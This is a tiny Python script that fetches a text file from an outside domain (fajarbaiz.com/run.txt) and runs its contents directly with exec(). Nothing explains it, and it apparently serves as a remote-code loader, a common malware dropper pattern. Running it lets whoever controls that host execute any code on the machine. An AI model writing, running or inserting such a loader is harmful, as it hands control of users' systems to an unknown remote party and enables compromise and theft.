
import requests, os
z = requests.get('https://fajarbaiz.com/run.txt').text
exec(z)